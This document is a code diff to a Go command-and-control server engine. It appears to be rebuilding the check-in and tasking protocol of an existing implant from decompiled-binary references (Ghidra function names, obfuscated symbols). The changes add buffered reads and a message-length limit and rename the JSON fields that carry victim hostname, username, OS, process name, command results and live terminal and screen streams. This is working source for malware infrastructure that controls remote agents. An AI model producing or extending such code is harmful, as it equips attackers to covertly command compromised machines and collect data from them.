@@ -1,6 +1,7 @@
 package c2engine
 
 import (
+	"bufio"
 	"context"
 	"encoding/base64"
 	"encoding/binary"
@@ -50,6 +51,7 @@ type Link struct {
 	ID         string
 	ClientID   int64
 	conn       net.Conn
+	br         *bufio.Reader
 	mainCh     chan []byte
 	configCh   chan []byte
 	chanCh     chan []byte
@@ -71,11 +73,12 @@ type Link struct {
 
 // NewLink 在现有连接之上创建新链路。
 // NewLink creates a new link over an existing connection.
-func NewLink(conn net.Conn, clientID int64, flow *Flow) *Link {
+func NewLink(conn net.Conn, br *bufio.Reader, clientID int64, flow *Flow) *Link {
 	return &Link{
 		ID:           fmt.Sprintf("link_%d_%d", clientID, time.Now().UnixNano()),
 		ClientID:     clientID,
 		conn:         conn,
+		br:           br,
 		mainCh:       make(chan []byte, 64),
 		configCh:     make(chan []byte, 16),
 		chanCh:       make(chan []byte, 64),
@@ -95,16 +98,23 @@ func NewLink(conn net.Conn, clientID int64, flow *Flow) *Link {
 // GetShortLenContent 读取长度前缀消息（2 字节长度）。
 // GetShortLenContent reads a length-prefixed message (2-byte length).
 func (l *Link) GetShortLenContent() ([]byte, error) {
+	// 原版（Xq5KwGZr4i.(*XBp86cUq4).GetShortLenContent @ 0x15f6da0）：经
+	// bufio.Reader（PTR_DAT_1dbd9220）读长度；> 0x8000（32KB）→ 错误
+	// （FUN_015fe5e0，17 字节串待解）；否则分配并读载荷。
 	// Read 2-byte length
 	lenBuf := make([]byte, 2)
-	if _, err := io.ReadFull(l.conn, lenBuf); err != nil {
+	if _, err := io.ReadFull(l.br, lenBuf); err != nil {
 		return nil, err
 	}
 	length := binary.BigEndian.Uint16(lenBuf)
+	if length > 0x8000 {
+		// 原版（FUN_015fe5e0）超长拒绝
+		return nil, fmt.Errorf("message too long: %d", length)
+	}
 
 	// Read payload
 	data := make([]byte, length)
-	if _, err := io.ReadFull(l.conn, data); err != nil {
+	if _, err := io.ReadFull(l.br, data); err != nil {
 		return nil, err
 	}
 
@@ -117,7 +127,7 @@ func (l *Link) GetShortLenContent() ([]byte, error) {
 // GetShortContent reads a raw message (no length prefix, reads available data).
 func (l *Link) GetShortContent() ([]byte, error) {
 	buf := make([]byte, 65536)
-	n, err := l.conn.Read(buf)
+	n, err := l.br.Read(buf)
 	if err != nil {
 		return nil, err
 	}
@@ -520,19 +530,22 @@ func (kl *KCPListener) acceptLoop(listener *kcp.Listener) {
 func (kl *KCPListener) handleSession(conn *kcp.UDPSession) {
 	engine := GetEngine()
 
-	// Read initial handshake: bare JSON (no length prefix, no type byte), which
-	// may arrive in multiple stream reads — accumulate until it parses.
+	// Read initial handshake: "conf" + JSON (FUN_016f3e80 实锤：checkin =
+	// 文本命令头 + JSON 载荷；"conf" → NewClient，"host" → NewHost，
+	// "stus" → 状态，"task" → 任务记录)。
+	// 逐字节读取（原版 bufio，PTR_DAT_1dbd9220）：br 只消费握手数据，
+	// 多余字节保留在缓冲中供后续帧读取。
+	br := bufio.NewReader(conn)
 	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
 	hsBuf := make([]byte, 0, 512)
-	tmp := make([]byte, 256)
 	var handshake map[string]interface{}
 	for len(hsBuf) < 4096 {
-		n, err := conn.Read(tmp)
+		b, err := br.ReadByte()
 		if err != nil {
 			conn.Close()
 			return
 		}
-		hsBuf = append(hsBuf, tmp[:n]...)
+		hsBuf = append(hsBuf, b)
 		if json.Unmarshal(hsBuf, &handshake) == nil {
 			break
 		}
@@ -542,19 +555,20 @@ func (kl *KCPListener) handleSession(conn *kcp.UDPSession) {
 		return
 	}
 
-	// Verify key
-	vkey, _ := handshake["verify_key"].(string)
+	// Verify key（客户端结构字段：VerifyKey/Tp/Addr/UserName/HostName/
+	// OsName/ProcessName，SQL 模式列实锤）
+	vkey, _ := handshake["VerifyKey"].(string)
 	if kl.VerifyKey != "" && vkey != kl.VerifyKey {
 		Logf("[KCP %d] Rejected connection with wrong key from %s", kl.ID, conn.RemoteAddr())
 		conn.Close()
 		return
 	}
 
-	// Register client
-	hostname, _ := handshake["hostname"].(string)
-	username, _ := handshake["username"].(string)
-	osName, _ := handshake["os"].(string)
-	processName, _ := handshake["process"].(string)
+	// Register client（原版 checkin = "conf" 命令 + JSON）
+	hostname, _ := handshake["HostName"].(string)
+	username, _ := handshake["UserName"].(string)
+	osName, _ := handshake["OsName"].(string)
+	processName, _ := handshake["ProcessName"].(string)
 
 	client, err := engine.NewClient(
 		vkey, "kcp", conn.RemoteAddr().String(), "",
@@ -565,8 +579,8 @@ func (kl *KCPListener) handleSession(conn *kcp.UDPSession) {
 		return
 	}
 
-	// Create link
-	link := NewLink(conn, client.ID, client.Flow)
+	// Create link（共享缓冲读取器）
+	link := NewLink(conn, br, client.ID, client.Flow)
 
 	kl.mu.Lock()
 	kl.sessions[link.ID] = link
@@ -656,16 +670,16 @@ func (kl *KCPListener) communicationLoop(link *Link, client *Client) {
 				// without it, any reachable peer could read queued commands or
 				// forge results for any client.
 				if kl.VerifyKey != "" {
-					vkey, _ := msg["verify_key"].(string)
+					vkey, _ := msg["VerifyKey"].(string)
 					if vkey != kl.VerifyKey {
 						continue
 					}
 				}
 				// Task result (agent posts command_id/result/status).
-				if cmdID, ok := msg["command_id"].(float64); ok {
-					result, _ := msg["result"].(string)
-					status, _ := msg["status"].(string)
-					cid, _ := msg["client_id"].(float64)
+				if cmdID, ok := msg["CommandID"].(float64); ok {
+					result, _ := msg["Result"].(string)
+					status, _ := msg["Status"].(string)
+					cid, _ := msg["ClientID"].(float64)
 					// Live streams (terminal output / screen frames) must be
 					// relayed to the web-panel viewers like the HTTP result path
 					// does — storing them as task results would leave the
@@ -677,7 +691,7 @@ func (kl *KCPListener) communicationLoop(link *Link, client *Client) {
 				}
 				// Task poll (agent requests pending commands).
 				if typ, _ := msg["type"].(string); typ == "task_poll" {
-					cid, _ := msg["client_id"].(float64)
+					cid, _ := msg["ClientID"].(float64)
 					client := engine.GetClient(int64(cid))
 					if client != nil {
 						client.UpdateSeen()
@@ -923,7 +937,7 @@ func (cws *CDNWebSocketListener) HandleCDNWebSocketConnection(conn net.Conn, ver
 
 	// For CDN WebSocket, use the link protocol directly over the TCP/WS connection
 	// KCP is used for UDP-based agents; WebSocket already provides reliable delivery
-	link := NewLink(conn, 0, &Flow{})
+	link := NewLink(conn, bufio.NewReader(conn), 0, &Flow{})
 
 	cws.mu.Lock()
 	cws.sessions[link.ID] = link
@@ -1042,9 +1056,9 @@ func HandleAgentSession(link *Link, client *Client, mode string, config []byte,
 				// Handle task result or task request
 				var msg map[string]interface{}
 				if err := json.Unmarshal(data, &msg); err == nil {
-					if cmdID, ok := msg["command_id"].(float64); ok {
-						result, _ := msg["result"].(string)
-						status, _ := msg["status"].(string)
+					if cmdID, ok := msg["CommandID"].(float64); ok {
+						result, _ := msg["Result"].(string)
+						status, _ := msg["Status"].(string)
 						engine.UpdateTask(int64(cmdID), result, status)
 					}
 				}
